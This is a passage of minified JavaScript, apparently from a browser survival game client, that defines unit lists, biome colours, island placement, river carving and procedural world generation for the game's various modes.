                            this.draw_life = rn;
                        break;
                    case Ye.FURNACE:
                        this.draw_bg = Kn,
                            this.draw = kn,
                            this.draw_fg = rr,
                            this.ground = new Utils.LinearAnimation(!1, 1, 1.23, 1.18, .02, .02),
                            this.halo = new Utils.LinearAnimation(!1, 1, 1.23, 1.18, .04, .04),
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            },
                            this.update = function (e) {
                                this.action = e
                            }
                }
            }
            function _2(e) {
                function se(e, t, i, n, r) {
                    for (var o = 0; o < r && 1 !== function (e, t, i, n, r) {
                        for (var t = t + Math.floor(Fe.RNG.get() * n), i = i + Math.floor(Fe.RNG.get() * n), o = 10 + Math.floor(Fe.RNG.get() * (Fe.nw - t - 20)), a = 10 + Math.floor(Fe.RNG.get() * (Fe.nh - i - 20)), s = o + t, _ = a + i, E = 0; E < Fe.biomes.length; E++) {
                            var u = Fe.biomes[E];
                            if (1 === Utils.intersect_aabb(o, s, a, _, u.x1 / 100 - r, u.x2 / 100 + r, u.y1 / 100 - r, u.y2 / 100 + r))
                                return 0
                        }
                        return Fe.biomes.push(new Fe.Biome(e, o, a, t, i, 15)),
                            1
                    }(e, t, i, n, 8); o++)
                        ;
                    return o === r ? 0 : 1
                }
                function I(e, t, i, n, r, o, a, s) {
                    for (var _ = Math.floor(a / 2), E = Math.max(1, Math.floor(a / 2)), u = Math.floor(s / 2), d = Math.max(1, Math.floor(s / 2)), T = 0; T < i; T++) {
                        for (var A = e - u; A < e + d; A++)
                            for (var h = t - _; h < t + E; h++)
                                1 === Te(A, h, "wtb", 0, 1) && o.push([A, h, 1]);
                        e += n,
                            t += r
                    }
                }
                function _e(e, t) {
                    for (var i, n, r, e = Fe.biomes[e], o = Math.floor(e.y1 / 100), a = Math.floor(e.x1 / 100), s = Math.floor(e.h / 100), _ = a + (n = Math.floor(e.w / 100)), E = 2, u = s, d = o, T = a + 10 + Math.floor((n - 20) * Fe.RNG.get()), A = T - 4; A < T + 4; A++)
                        Te(o - 1, A, "wtb", 0, 1);
                    for (; 0 < u;)
                        if (2 !== E)
                            if (u < 10)
                                for (h = 1; 0 < u; h++)
                                    I(d, T, 1, 1, 0, t, h, 1),
                                        --u,
                                        d += 1;
                            else
                                1 !== E ? (E = 1,
                                    i = Math.floor(1 + 2 * Fe.RNG.get()),
                                    r = 1 + Math.floor(4 * Fe.RNG.get()),
                                    T < a + 16 || !(_ - 16 < T) && .5 < Fe.RNG.get() ? (I(d, T, i, 0, 1, t, r, r),
                                        T += i) : (I(d, T, i, 0, -1, t, r, r),
                                            T -= i)) : (I(d, T, r = Math.min(u, Math.floor(1 + 4 * Fe.RNG.get())), 1, 0, t, n = 1 + Math.floor(4 * Fe.RNG.get()), n),
                                                E = 0,
                                                u -= r,
                                                d += r);
                        else {
                            for (var h = 10; 1 < h; h--)
                                I(d, T, 1, 1, 0, t, h, 1),
                                    --u,
                                    d += 1;
                            E = 0
                        }
                    for (A = T - 1; A < T + 2; A++)
                        Te(d, A, "wtb", 0, 1)
                }
                function Ee(e, t) {
                    for (var i = 0; i < t.length; i++) {
                        n = s = a = o = r = void 0;
                        var n, r = t[i][0], o = t[i][1], a = e, s = t[i][2];
                        _(r, o) && (void 0 === (tiles = Eo.tiles)[r][o] && (tiles[r][o] = {}),
                            void 0 === tiles[r][o].r) && (n = 0,
                                _(r - 1, o) && void 0 !== tiles[r - 1][o] && void 0 !== tiles[r - 1][o].wtb && (n += 2),
                                _(r, o - 1) && void 0 !== tiles[r][o - 1] && void 0 !== tiles[r][o - 1].wtb && (n += 8),
                                _(r, o + 1) && void 0 !== tiles[r][o + 1] && void 0 !== tiles[r][o + 1].wtb && (n += 16),
                                _(r + 1, o) && void 0 !== tiles[r + 1][o] && void 0 !== tiles[r + 1][o].wtb && (n += 64),
                                _(r - 1, o - 1) && 10 == (10 & n) && void 0 !== tiles[r - 1][o - 1] && void 0 !== tiles[r - 1][o - 1].wtb && (n += 1),
                                _(r - 1, o + 1) && 18 == (18 & n) && void 0 !== tiles[r - 1][o + 1] && void 0 !== tiles[r - 1][o + 1].wtb && (n += 4),
                                _(r + 1, o - 1) && 72 == (72 & n) && void 0 !== tiles[r + 1][o - 1] && void 0 !== tiles[r + 1][o - 1].wtb && (n += 32),
                                _(r + 1, o + 1) && 80 == (80 & n) && void 0 !== tiles[r + 1][o + 1] && void 0 !== tiles[r + 1][o + 1].wtb && (n += 128),
                                tiles[r][o].r = {},
                                tiles[r][o].r.river = n,
                                tiles[r][o].r.current = s,
                                tiles[r][o].r.dist = Fe.dist_from_biome(a, 100 * o + 50, 100 * r + 50) - 400,
                                tiles[r][o].r.x = 100 * o + 50,
                                tiles[r][o].r.y = 100 * r + 50)
                    }
                }
                function ue(e) {
                    e = Fe.biomes[e];
                    Te(-3 + Math.floor(e.y2 / 100), -1 + Math.floor(e.x2 / 100), "s", 0, 0),
                        Te(3 + Math.floor(e.y1 / 100), -1 + Math.floor(e.x2 / 100), "s", 0, 0),
                        Te(-3 + Math.floor(e.y2 / 100), 1 + Math.floor(e.x1 / 100), "s", 0, 0),
                        Te(3 + Math.floor(e.y1 / 100), 1 + Math.floor(e.x1 / 100), "s", 0, 0)
                }
                function de(e, t, i, n, r) {
                    var o = Fe.biomes[e]
                        , a = Math.floor(o.x1 / 100)
                        , s = Math.floor(o.y1 / 100)
                        , _ = Math.floor(o.w / 100)
                        , E = Math.floor(o.h / 100);
                    void 0 !== r && (r = 1 - r,
                        a += Math.floor(_ * r / 2),
                        s += Math.floor(E * r / 2),
                        _ -= Math.floor(_ * r),
                        E -= Math.floor(E * r));
                    for (var u = Eo.tiles, d = 0, T = 0; d < n && !(5e4 < T); T++) {
                        var A, h = s + Math.floor(Fe.RNG.get() * E), l = a + Math.floor(Fe.RNG.get() * _);
                        Fe.dist_from_biome(e, 100 * l + 50, 100 * h + 50) < 400 || void 0 !== (A = u[h][l + 1]) && void 0 !== A[t] && void 0 !== A[t][i] || void 0 !== (A = u[h][l - 1]) && void 0 !== A[t] && void 0 !== A[t][i] || void 0 !== (A = u[h + 1][l]) && void 0 !== A[t] && void 0 !== A[t][i] || void 0 !== (A = u[h - 1][l]) && void 0 !== A[t] && void 0 !== A[t][i] || void 0 !== (A = u[h + 1][l - 1]) && void 0 !== A[t] && void 0 !== A[t][i] || void 0 !== (A = u[h - 1][l + 1]) && void 0 !== A[t] && void 0 !== A[t][i] || void 0 !== (A = u[h + 1][l + 1]) && void 0 !== A[t] && void 0 !== A[t][i] || void 0 !== (A = u[h - 1][l - 1]) && void 0 !== A[t] && void 0 !== A[t][i] || void 0 === u[h][l] && (Te(h, l, t, i, 1),
                            d++)
                    }
                }
                function _(e, t) {
                    return 0 <= e && 0 <= t && e < Fe.nh && t < Fe.nw
                }
                function Te(e, t, i, n, r) {
                    if (!(e < 0 || t < 0 || e >= Fe.nh || t >= Fe.nw))
                        return void 0 === (tiles = Eo.tiles)[e][t] && (tiles[e][t] = {}),
                            void 0 !== tiles[e][t][i] ? 0 : (tiles[e][t][i] = [],
                                tiles[e][t][i][n] = [{
                                    x: 100 * t + 50,
                                    y: 100 * e + 50
                                }],
                                1 === r && $e.push([i, n, e, t]),
                                1)
                }
                function s(e, t, i) {
                    if (e[t])
                        for (F = 0; F < e[t].length; F++)
                            if (e[t][F])
                                for (l = 0; l < e[t][F].length; l++)
                                    e[t][F][l].hit = i,
                                        e[t][F][l].update = !1,
                                        e[t][F][l].time = 0,
                                        e[t][F][l].angle = 0
                }
                this.mode = Ue.MODE_PVP,
                    this.max_units = e,
                    this.custom_map = 0,
                    this.islands = 6,
                    this.players = [],
                    this.units = [],
                    this.units[Ye.PLAYERS] = [],
                    this.units[Ye.FRUIT] = [],
                    this.units[Ye.RABBIT] = [],
                    this.units[Ye.WOLF] = [],
                    this.units[Ye.CRAB] = [],
                    this.units[Ye.BOAR] = [],
                    this.units[Ye.BABY_MAMMOTH] = [],
                    this.units[Ye.CRAB_BOSS] = [],
                    this.units[Ye.BABY_DRAGON] = [],
                    this.units[Ye.BABY_LAVA] = [],
                    this.units[Ye.HAWK] = [],
                    this.units[Ye.PIRANHA] = [],
                    this.units[Ye.KRAKEN] = [],
                    this.units[Ye.FOX] = [],
                    this.units[Ye.PENGUIN] = [],
                    this.units[Ye.SPELL] = [],
                    this.units[Ye.FIREFLY] = [],
                    this.units[Ye.BEAR] = [],
                    this.units[Ye.MAMMOTH] = [],
                    this.units[Ye.DRAGON] = [],
                    this.units[Ye.LAVA_DRAGON] = [],
                    this.units[Ye.FLAME] = [],
                    this.units[Ye.WHEAT_MOB] = [],
                    this.units[Ye.ALOE_VERA_MOB] = [],
                    this.units[Ye.PUMPKIN_MOB] = [],
                    this.units[Ye.GARLIC_MOB] = [],
                    this.units[Ye.THORNBUSH_MOB] = [],
                    this.units[Ye.TREASURE_CHEST] = [],
                    this.units[Ye.DEAD_BOX] = [],
                    this.units[Ye.CRATE] = [],
                    this.units[Ye.BREAD_OVEN] = [],
                    this.units[Ye.SIGN] = [],
                    this.units[Ye.SPIDER] = [],
                    this.units[Ye.WORKBENCH] = [],
                    this.units[Ye.FIRE] = [],
                    this.units[Ye.BIG_FIRE] = [],
                    this.units[Ye.SEED] = [],
                    this.units[Ye.SPIKE] = [],
                    this.units[Ye.STONE_SPIKE] = [],
                    this.units[Ye.GOLD_SPIKE] = [],
                    this.units[Ye.DIAMOND_SPIKE] = [],
                    this.units[Ye.AMETHYST_SPIKE] = [],
                    this.units[Ye.REIDITE_SPIKE] = [],
                    this.units[Ye.WALL] = [],
                    this.units[Ye.STONE_WALL] = [],
                    this.units[Ye.GOLD_WALL] = [],
                    this.units[Ye.DIAMOND_WALL] = [],
                    this.units[Ye.AMETHYST_WALL] = [],
                    this.units[Ye.REIDITE_WALL] = [],
                    this.units[Ye.BED] = [],
                    this.units[Ye.WOOD_DOOR] = [],
                    this.units[Ye.STONE_DOOR] = [],
                    this.units[Ye.GOLD_DOOR] = [],
                    this.units[Ye.DIAMOND_DOOR] = [],
                    this.units[Ye.AMETHYST_DOOR] = [],
                    this.units[Ye.REIDITE_DOOR] = [],
                    this.units[Ye.WOOD_DOOR_SPIKE] = [],
                    this.units[Ye.STONE_DOOR_SPIKE] = [],
                    this.units[Ye.GOLD_DOOR_SPIKE] = [],
                    this.units[Ye.DIAMOND_DOOR_SPIKE] = [],
                    this.units[Ye.AMETHYST_DOOR_SPIKE] = [],
                    this.units[Ye.REIDITE_DOOR_SPIKE] = [],
                    this.units[Ye.FURNACE] = [],
                    this.units[Ye.TOTEM] = [],
                    this.units[Ye.WOOD_TOWER] = [],
                    this.units[Ye.CHEST] = [],
                    this.units[Ye.RESURRECTION] = [],
                    this.units[Ye.EMERALD_MACHINE] = [],
                    this.units[Ye.BRIDGE] = [],
                    this.units[Ye.ROOF] = [],
                    this.units[Ye.PLOT] = [],
                    this.units[Ye.WHEAT_SEED] = [],
                    this.units[Ye.ALOE_VERA_SEED] = [],
                    this.units[Ye.PUMPKIN_SEED] = [],
                    this.units[Ye.TOMATO_SEED] = [],
                    this.units[Ye.CARROT_SEED] = [],
                    this.units[Ye.WATERMELON_SEED] = [],
                    this.units[Ye.GARLIC_SEED] = [],
                    this.units[Ye.THORNBUSH_SEED] = [],
                    this.units[Ye.WINDMILL] = [],
                    this.units[Ye.EXTRACTOR_MACHINE_STONE] = [],
                    this.units[Ye.EXTRACTOR_MACHINE_GOLD] = [],
                    this.units[Ye.EXTRACTOR_MACHINE_DIAMOND] = [],
                    this.units[Ye.EXTRACTOR_MACHINE_AMETHYST] = [],
                    this.units[Ye.EXTRACTOR_MACHINE_REIDITE] = [],
                    this.units[Ye.WELL] = [],
                    this.units[Ye.GIFT] = [],
                    this.units[Ye.GARLAND] = [],
                    this.fast_units = [],
                    this.nw = 260,
                    this.nh = 260,
                    this.dw = 100,
                    this.dh = 100,
                    this.w = this.nw * this.dw,
                    this.h = this.nh * this.dh,
                    this.RNG = new k.Random,
                    this.biomes = [],
                    this.shade = new Utils.LinearAnimation(!1, 0, 1, 0, 1, 1),
                    this.transition = !1,
                    this.BIOME = [],
                    this.BIOME_FOREST = 0,
                    this.BIOME_WINTER = 1,
                    this.BIOME_LAVA = 2,
                    this.BIOME_DRAGON = 3,
                    this.BIOME_SEA = 4,
                    this.BIOME_DESERT = 10,
                    this.BIOME[this.BIOME_FOREST] = {
                        isSand: 1,
                        day: [19, 58, 43],
                        night: [4, 43, 48],
                        _color: ["#133a2b", "#042b30"]
                    },
                    this.BIOME[this.BIOME_SEA] = {
                        isSand: 0,
                        day: [11, 106, 132],
                        night: [9, 55, 63],
                        _color: ["#0B6A84", "#09373F"]
                    },
                    this.BIOME[this.BIOME_WINTER] = {
                        isSand: 0,
                        day: [235, 242, 240],
                        night: [19, 97, 103],
                        _color: ["#EBF2F0", "#136167"]
                    },
                    this.BIOME[this.BIOME_LAVA] = {
                        isSand: 0,
                        day: [45, 32, 23],
                        night: [3, 28, 30],
                        _color: ["#2D2017", "#031C1E"]
                    },
                    this.BIOME[this.BIOME_DRAGON] = {
                        isSand: 0,
                        day: [74, 74, 74],
                        night: [24, 61, 60],
                        _color: ["#4A4A4A", "#183D3C"]
                    },
                    this.BIOME[this.BIOME_DESERT] = {
                        isSand: 0,
                        day: [235, 216, 166],
                        night: [9, 61, 56],
                        _color: ["#EBD8A6", "#093D38"]
                    },
                    this.Biome = function (e, t, i, n, r, o) {
                        this.x1 = 100 * t,
                            this.y1 = 100 * i,
                            this.w = 100 * n,
                            this.h = 100 * r,
                            this.x2 = 100 * (t + n),
                            this.y2 = 100 * (i + r),
                            this.t = e,
                            this.v = void 0 === o ? 15 : o
                    }
                    ,
                    this.MAX_DIST = -1e6,
                    this.dist_winter = this.MAX_DIST,
                    this.dist_desert = this.MAX_DIST,
                    this.dist_lava = this.MAX_DIST,
                    this.dist_forest = this.MAX_DIST,
                    this.dist_water = this.MAX_DIST,
                    this.dist_dragon = this.MAX_DIST,
                    this.dist_from_biomes = function (e) {
                        var t = e.r.x
                            , i = e.r.y
                            , n = Math.floor(i / 100)
                            , r = Math.floor(t / 100);
                        e.dist_winter = Fe.MAX_DIST,
                            e.dist_desert = Fe.MAX_DIST,
                            e.dist_lava = Fe.MAX_DIST,
                            e.dist_forest = Fe.MAX_DIST,
                            e.dist_dragon = Fe.MAX_DIST,
                            e.dist_sand = Fe.MAX_DIST;
                        for (var o, a = 0; Fe.biomes[a].t !== Fe.BIOME_SEA; a++)
                            Fe.biomes[a].t === Fe.BIOME_FOREST ? (o = Fe.dist_from_biome(a, t, i),
                                e.dist_forest = Math.max(e.dist_forest, o),
                                0 < o && 1 === Fe.dist_from_sand(a, t, i) && (e.dist_sand = 1)) : Fe.biomes[a].t === Fe.BIOME_WINTER ? e.dist_winter = Math.max(e.dist_winter, Fe.dist_from_biome(a, t, i)) : Fe.biomes[a].t === Fe.BIOME_DESERT ? e.dist_desert = Math.max(e.dist_desert, Fe.dist_from_biome(a, t, i)) : Fe.biomes[a].t === Fe.BIOME_LAVA ? e.dist_lava = Math.max(e.dist_lava, Fe.dist_from_biome(a, t, i)) : Fe.biomes[a].t === Fe.BIOME_DRAGON && (e.dist_dragon = Math.max(e.dist_dragon, Fe.dist_from_biome(a, t, i)));
                        Eo.tiles[n][r].iblk && (e.dist_sand = 1),
                            !Fe.find_bridge(r, n) && (Eo.tiles[n][r].wtb || e.dist_winter < 0 && e.dist_lava < 0 && e.dist_forest < 0 && e.dist_sand < 0 && e.dist_dragon < 0 && e.dist_desert < 0) ? e.dist_water = 1 : e.dist_water = e.MAX_DIST
                    }
                    ,
                    this.update_dist_from_biomes = function (e, t) {
                        Fe.dist_winter = Fe.MAX_DIST,
                            Fe.dist_desert = Fe.MAX_DIST,
                            Fe.dist_lava = Fe.MAX_DIST,
                            Fe.dist_dragon = Fe.MAX_DIST,
                            Fe.dist_forest = Fe.MAX_DIST;
                        for (var i = 0; Fe.biomes[i].t !== Fe.BIOME_SEA; i++)
                            Fe.biomes[i].t === Fe.BIOME_FOREST ? Fe.dist_forest = Math.max(Fe.dist_forest, Fe.dist_from_biome(i, e, t)) : Fe.biomes[i].t === Fe.BIOME_WINTER ? Fe.dist_winter = Math.max(Fe.dist_winter, Fe.dist_from_biome(i, e, t)) : Fe.biomes[i].t === Fe.BIOME_DESERT ? Fe.dist_desert = Math.max(Fe.dist_desert, Fe.dist_from_biome(i, e, t)) : Fe.biomes[i].t === Fe.BIOME_LAVA ? Fe.dist_lava = Math.max(Fe.dist_lava, Fe.dist_from_biome(i, e, t)) : Fe.biomes[i].t === Fe.BIOME_DRAGON && (Fe.dist_dragon = Math.max(Fe.dist_dragon, Fe.dist_from_biome(i, e, t)));
                        Fe.dist_winter < 0 && Fe.dist_dragon < 0 && Fe.dist_forest < 0 && Fe.dist_dragon < 0 && Fe.dist_desert < 0 ? Fe.dist_water = 1 : Fe.dist_water = Fe.MAX_DIST
                    }
                    ,
                    this.dist_from_sand = function (e, t, i) {
                        var e = Fe.biomes[e]
                            , n = 0
                            , r = t - (x1 = e.x1 + 30 + (0 == (e.v & Ue.LEFT) ? 150 : 0));
                        return 0 < (e.v & Ue.LEFT) && 0 < r && r < 320 && (n = 1),
                            r = i - (y1 = e.y1 + 250 + (0 == (e.v & Ue.TOP) ? 150 : 0)),
                            0 < (e.v & Ue.TOP) && 0 < r && r < 320 && (n = 1),
                            r = (x2 = e.x2 + 80 + (0 == (e.v & Ue.RIGHT) ? -200 : 0)) - t,
                            0 < (e.v & Ue.RIGHT) && 0 < r && r < 320 && (n = 1),
                            r = (y2 = e.y2 - 200 + (0 == (e.v & Ue.BOTTOM) ? -200 : 0)) - i,
                            0 < (e.v & Ue.BOTTOM) && 0 < r && r < 320 && (n = 1),
                            t >= x1 && t <= x2 && i >= y1 && i <= y2 ? n : 0
                    }
                    ,
                    this.dist_from_biome = function (e, t, i) {
                        var e = Fe.biomes[e];
                        return x1 = e.x1 + 30,
                            y1 = e.y1 + 250,
                            x2 = e.x2 + 80,
                            y2 = e.y2 - 200,
                            t >= x1 && t <= x2 && i >= y1 && i <= y2 ? Math.min(t - x1, x2 - t, i - y1, y2 - i) : (e = -1e6,
                                t - x1 < 0 ? e = Math.max(e, t - x1) : x2 - t < 0 && (e = Math.max(e, x2 - t)),
                                distY = -1e6,
                                (i < y1 || i > y2) && (distY = i - y1 < 0 ? Math.max(distY, i - y1) : Math.max(distY, y2 - i),
                                    e = -1e6 !== e && -1e6 !== distY ? Math.min(e, distY) : distY),
                                e)
                    }
                    ,
                    this.add_island = function (e, t, i) {
                        var n = i
                            , r = t;
                        Te(n, r, "isl", e, 1);
                        for (var o = 0; o < 4; o++)
                            for (var a = 0; a < 3; a++)
                                Te(n - a, r - o, "iblk", 0),
                                    Te(n + a, r - o, "iblk", 0),
                                    Te(n + a, r + o, "iblk", 0),
                                    Te(n - a, r + o, "iblk", 0);
                        if (0 === e) {
                            for (o = 0; o < 2; o++)
                                Te(n - o, r - 4, "iblk", 0),
                                    Te(n + o, r - 4, "iblk", 0),
                                    Te(n - o, r + 4, "iblk", 0),
                                    Te(n + o, r + 4, "iblk", 0);
                            for (o = 0; o < 3; o++)
                                Te(n - 3, r + o, "iblk", 0),
                                    Te(n + 3, r + o, "iblk", 0),
                                    Te(n - 3, r - o, "iblk", 0),
                                    Te(n + 3, r - o, "iblk", 0);
                            Te(n - 2, r - 4, "iblk", 0),
                                Te(n - 3, r - 3, "iblk", 0),
                                Te(n + 2, r + 4, "iblk", 0),
                                Te(n + 3, r + 3, "iblk", 0)
                        } else if (1 === e) {
                            for (o = 0; o < 3; o++)
                                Te(n - o, r - 4, "iblk", 0),
                                    Te(n + o, r - 4, "iblk", 0),
                                    Te(n - o, r + 4, "iblk", 0),
                                    Te(n + o, r + 4, "iblk", 0);
                            for (o = 0; o < 4; o++)
                                Te(n - 3, r + o, "iblk", 0),
                                    Te(n + 3, r + o, "iblk", 0),
                                    Te(n - 3, r - o, "iblk", 0),
                                    Te(n + 3, r - o, "iblk", 0)
                        } else if (2 === e) {
                            for (o = 0; o < 2; o++)
                                Te(n - o, r - 4, "iblk", 0),
                                    Te(n + o, r - 4, "iblk", 0),
                                    Te(n - o, r + 4, "iblk", 0),
                                    Te(n + o, r + 4, "iblk", 0);
                            for (o = 0; o < 3; o++)
                                Te(n - 3, r + o, "iblk", 0),
                                    Te(n + 3, r + o, "iblk", 0),
                                    Te(n - 3, r - o, "iblk", 0),
                                    Te(n + 3, r - o, "iblk", 0)
                        }
                    }
                    ,
                    this.add_islands = function (e) {
                        for (var t = 0; t < Fe.biomes.length && 0 < e; t++) {
                            var i = Fe.biomes[t];
                            if (i.t === Fe.BIOME_SEA && 1800 < i.w && 1e3 < i.h) {
                                var n = Math.floor((i.x1 + i.w / 2) / 100)
                                    , r = Math.floor((i.y1 + i.h / 2) / 100);
                                Fe.add_island(e % 3, n, r);
                                for (var o = 0; o < 3; o++) {
                                    var a = r - 2 + Math.floor(4 * Fe.RNG.get())
                                        , s = n - 3 + Math.floor(6 * Fe.RNG.get());
                                    void 0 === Eo.tiles[a][s].s && Te(a, s, "plm", o),
                                        a = r - 2 + Math.floor(4 * Fe.RNG.get()),
                                        s = n - 3 + Math.floor(6 * Fe.RNG.get()),
                                        void 0 === Eo.tiles[a][s].plm && Te(a, s, "s", o)
                                }
                                a = r - 2 + Math.floor(4 * Fe.RNG.get()),
                                    s = n - 3 + Math.floor(6 * Fe.RNG.get()),
                                    void 0 === Eo.tiles[a][s].plm && void 0 === Eo.tiles[a][s].s && Te(a, s, "p", 0, 1),
                                    e--
                            }
                        }
                    }
                    ,
                    this.generate_world = function (z) {
                        Fe.RNG.init(z);
                        for (var B = 0; ;) {
                            if (1e4 < ++B)
                                return;
                            if (Fe.biomes = [],
                                0 !== Fe.custom_map || Fe.mode !== Ue.MODE_VAMPIRES && Fe.mode !== Ue.MODE_EXPERIMENTAL && Fe.mode !== Ue.MODE_PVP || (Fe.custom_map = Ae),
                                Fe.mode === Ue.MODE_ZOMBIES)
                                Fe.biomes.push(new Fe.Biome(Fe.BIOME_FOREST, 2, 2, 80, 80, 15));
                            else if (Fe.mode === Ue.MODE_LEGACY)
                                Fe.biomes.push(new Fe.Biome(Fe.BIOME_FOREST, 2, 2, 150, 150, 15));
                            else if (0 !== Fe.custom_map && 0 < Fe.custom_map.length && 3 < Fe.custom_map[0].length)
                                for (var e = 0; e < Fe.custom_map.length && 0 === (T = Fe.custom_map[e])[0]; e++) {
                                    var t = Ue.BIOME_FOREST;
                                    switch (T[1]) {
                                        case "FOREST":
                                            t = Fe.BIOME_FOREST;
                                            break;
                                        case "WINTER":
                                            t = Fe.BIOME_WINTER;
                                            break;
                                        case "DESERT":
                                            t = Fe.BIOME_DESERT;
                                            break;
                                        case "LAVA":
                                            t = Fe.BIOME_LAVA;
                                            break;
                                        case "DRAGON":
                                            t = Fe.BIOME_DRAGON
                                    }
                                    Fe.biomes.push(new Fe.Biome(t, T[2], T[3], T[4], T[5], T[6], T[7]))
                                }
                            else if (0 !== Fe.custom_map) {
                                for (e = 0; e < Fe.custom_map.length; e++) {
                                    var i = Fe.custom_map[e]
                                        , t = Ue.BIOME_FOREST;
                                    switch (i[0]) {
                                        case "FOREST":
                                            t = Fe.BIOME_FOREST;
                                            break;
                                        case "WINTER":
                                            t = Fe.BIOME_WINTER;
                                            break;
                                        case "DESERT":
                                            t = Fe.BIOME_DESERT;
                                            break;
                                        case "LAVA":
                                            t = Fe.BIOME_LAVA;
                                            break;
                                        case "DRAGON":
                                            t = Fe.BIOME_DRAGON
                                    }
                                    if (0 === se(t, i[1], i[2], 0, 10 * (e + 1)))
                                        break
                                }
                                if (e !== Fe.custom_map.length)
                                    continue
                            }
                            break
                        }
                        render_minimap();
                        for (var n = [], r = 0; r < Fe.nh; r++) {
                            n[r] = new Array(Fe.nw);
                            for (var w = 0; w < Fe.nw; w++)
                                n[r][w] = 0
                        }
                        for (r = 0; r < Fe.biomes.length; r++)
                            for (var W = (i = Fe.biomes[r]).x2 / 100, V = i.y2 / 100, o = i.x1 / 100; o <= W; o++)
                                for (var a = i.y1 / 100; a <= V; a++)
                                    n[a][o] = 1;
                        for (a = 0; a < Fe.nh; a++)
                            for (o = 0; o < Fe.nw; o++)
                                if (0 === n[a][o]) {
                                    k = void 0;
                                    s = void 0;
                                    _ = void 0;
                                    E = void 0;
                                    u = void 0;
                                    d = void 0;
                                    var k = n;
                                    var s = o;
                                    var _ = a;
                                    for (var E = s, u = _; u < Fe.nh; u++) {
                                        for (var d = s; d < Fe.nw && !((E = u === _ ? Math.max(d, E) : E) < d) && 1 !== k[u][d]; d++)
                                            k[u][d] = 1;
                                        if (d < E)
                                            break
                                    }
                                    Fe.biomes.push(new Fe.Biome(Fe.BIOME_SEA, s, _, E - s + 1, u - _, 15))
                                }
                        for (Eo = {
                            w: Fe.nw,
                            h: Fe.nh,
                            tiles: []
                        },
                            r = 0; r < Fe.nh; r++)
                            Eo.tiles[r] = [];
                        if (0 !== Fe.custom_map && 0 < Fe.custom_map.length && 3 < Fe.custom_map[0].length)
                            for (e = 0; e < Fe.custom_map.length; e++)
                                "isl" === (T = Fe.custom_map[e])[1] && Fe.add_island(T[2], T[3], T[4]);
                        else
                            Fe.add_islands(Fe.islands);
                        if (0 !== Fe.custom_map && 0 < Fe.custom_map.length && 3 < Fe.custom_map[0].length) {
                            for (var T, K = [], e = 0; e < Fe.custom_map.length; e++)
                                1 === (T = Fe.custom_map[e])[0] && ("r" === T[1] ? (Te(T[3], T[2], "wtb", 0, 1),
                                    K.push([T[3], T[2], T[4]])) : Te(T[4], T[3], T[1], T[2], T[5]));
                            Ee(0, K),
                                K = []
                        } else
                            for (r = 0; r < Fe.biomes.length; r++)
                                if (i = Fe.biomes[r],
                                    Fe.mode === Ue.MODE_LEGACY) {
                                    if (i.t === Fe.BIOME_FOREST) {
                                        U = l = h = A = void 0;
                                        for (var A = r, h = i.w / 1e4, l = 0; l < 6; l++)
                                            de(A, "t", l, Math.floor(80 * h));
                                        for (l = 0; l < 4; l++)
                                            de(A, "b", l, Math.floor(80 * h));
                                        for (l = 0; l < 3; l++)
                                            de(A, "s", l, Math.floor(50 * h));
                                        for (var U = [], l = 0; l < 6; l++)
                                            _e(A, U);
                                        for (Ee(A, U),
                                            U = [],
                                            de(A, "p", 0, Math.floor(28 * h)),
                                            l = 0; l < 3; l++)
                                            de(A, "g", l, Math.floor(7 * h));
                                        for (l = 0; l < 3; l++)
                                            de(A, "d", l, Math.floor(2 * h));
                                        for (l = 0; l < 3; l++)
                                            de(A, "a", l, Math.floor(+h));
                                        for (l = 0; l < 3; l++)
                                            de(A, "m", l, Math.floor(+h));
                                        de(A, "a", 0, Math.floor(+h)),
                                            ue(A)
                                    }
                                } else {
                                    if (i.t === Fe.BIOME_FOREST) {
                                        g = O = c = I = void 0;
                                        for (var I = r, c = i.w / 1e4, O = 0; O < 6; O++)
                                            de(I, "t", O, Math.floor(20 * c));
                                        for (O = 0; O < 4; O++)
                                            de(I, "b", O, Math.floor(20 * c));
                                        for (O = 0; O < 3; O++)
                                            de(I, "s", O, Math.floor(20 * c));
                                        var g = [];
                                        for (_e(I, g),
                                            Ee(I, g),
                                            de(I, "p", 0, Math.floor(24 * c)),
                                            O = 0; O < 3; O++)
                                            de(I, "g", O, Math.floor(5 * c));
                                        if (Fe.mode === Ue.MODE_ZOMBIES) {
                                            for (O = 0; O < 3; O++)
                                                de(I, "d", O, Math.floor(3 * c));
                                            for (O = 0; O < 3; O++)
                                                de(I, "a", O, Math.floor(2 * c))
                                        }
                                        ue(I)
                                    }
                                    if (i.t === Fe.BIOME_LAVA) {
                                        Z = q = S = N = b = j = X = J = x = C = F = Y = m = R = p = void 0;
                                        for (var p = r, R = i.w / 1e4, Y = 80 * R, F = p, C = Fe.biomes[F], x = 0, J = 0; x < Y && J < 1e4; J++) {
                                            var X = C.y1 + Fe.RNG.get() * C.h
                                                , j = C.x1 + Fe.RNG.get() * C.w
                                                , b = Math.floor(X / 100)
                                                , N = Math.floor(j / 100);
                                            if (!(Fe.dist_from_biome(F, 100 * N + 50, 100 * b + 50) < 600)) {
                                                for (var S = 1, q = b - 4; 1 === S && q <= b + 4; q++)
                                                    for (var Z = N - 4; 1 === S && Z <= N + 4; Z++)
                                                        void 0 !== Eo.tiles[q][Z] && (S = 0);
                                                0 !== S && (Te(b, N, "la", x % 6, 0),
                                                    x++)
                                            }
                                        }
                                        for (var m = 0; m < 3; m++)
                                            de(p, "s", m, Math.floor(12 * R));
                                        for (m = 0; m < 3; m++)
                                            de(p, "g", m, Math.floor(6 * R));
                                        for (m = 0; m < 3; m++)
                                            de(p, "re", m, Math.max(1, Math.floor(+R)), .2);
                                        for (m = 0; m < 3; m++)
                                            de(p, "a", m, Math.max(1, Math.floor(2 * R)));
                                        ue(p)
                                    }
                                    if (i.t === Fe.BIOME_WINTER) {
                                        M = v = D = void 0;
                                        for (var D = r, v = i.w / 1e4, M = 0; M < 3; M++)
                                            de(D, "s", M, Math.floor(18 * v));
                                        for (M = 0; M < 3; M++)
                                            de(D, "f", M, Math.floor(24 * v));
                                        for (M = 0; M < 3; M++)
                                            de(D, "d", M, Math.max(1, Math.floor(2 * v)), .3);
                                        for (M = 0; M < 3; M++)
                                            de(D, "g", M, Math.floor(6 * v));
                                        ue(D)
                                    }
                                    if (i.t === Fe.BIOME_DESERT) {
                                        ee = $ = y = ae = oe = re = ne = ie = G = te = g = L = Q = f = void 0;
                                        for (var f = r, Q = i.w / 1e4, L = 0; L < 3; L++)
                                            de(f, "s", L, Math.floor(12 * Q));
                                        for (L = 0; L < 3; L++)
